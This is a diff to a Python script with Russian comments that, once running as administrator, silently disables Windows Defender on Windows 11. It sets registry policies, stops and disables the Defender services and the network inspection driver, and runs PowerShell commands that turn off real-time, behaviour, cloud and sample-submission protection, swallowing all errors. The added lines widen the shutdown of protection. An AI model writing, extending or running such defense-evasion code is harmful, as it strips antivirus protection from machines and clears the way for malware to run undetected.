@@ -27,47 +27,58 @@ def run_as_admin():
 if not run_as_admin():
     sys.exit()
 
-time.sleep(1)
+time.sleep(2)
 
-# Команды для отключения Защитника в Windows 11
+# Команды для Windows 11
 commands = [
-    # Сначала отключаем Tamper Protection
+    # Отключаем Tamper Protection через разные методы
     'reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
     'reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features" /v "TamperProtectionSource" /t REG_DWORD /d 0 /f',
     
     # Основные политики отключения
     'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
     'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f',
+    
+    # Реальная защита в реальном времени
     'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
     'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f',
+    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f',
+    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f',
     
-    # Дополнительные настройки для Windows 11
-    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Security Center" /v "DisableVirusUI" /t REG_DWORD /d 1 /f',
+    # Центр безопасности Windows 11
+    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender Security Center" /v "DisableVirusUI" /t REG_DWORD /d 1 /f',
     
-    # Останавливаем службы
+    # Службы Windows 11
     'sc stop WinDefend',
     'sc config WinDefend start= disabled',
     'sc stop WdNisSvc',
     'sc config WdNisSvc start= disabled',
     'sc stop SecurityHealthService',
     'sc config SecurityHealthService start= disabled',
+    'sc stop WdNisDrv',
+    'sc config WdNisDrv start= disabled',
     
     # Обновляем политики
     'gpupdate /force'
 ]
 
+# Выполняем команды
 for cmd in commands:
     try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        subprocess.run(cmd, shell=True, capture_output=True)
         time.sleep(0.5)
-    except Exception as e:
+    except:
         pass
 
-# Дополнительные PowerShell команды
+# PowerShell команды для Windows 11
 ps_commands = [
     "Set-MpPreference -DisableRealtimeMonitoring $true",
     "Set-MpPreference -DisableBehaviorMonitoring $true",
-    "Set-MpPreference -PUAProtection disable"
+    "Set-MpPreference -DisableBlockAtFirstSeen $true",
+    "Set-MpPreference -DisableIOAVProtection $true",
+    "Set-MpPreference -PUAProtection disable",
+    "Set-MpPreference -MAPSReporting 0",
+    "Set-MpPreference -SubmitSamplesConsent 2"
 ]
 
 for cmd in ps_commands:
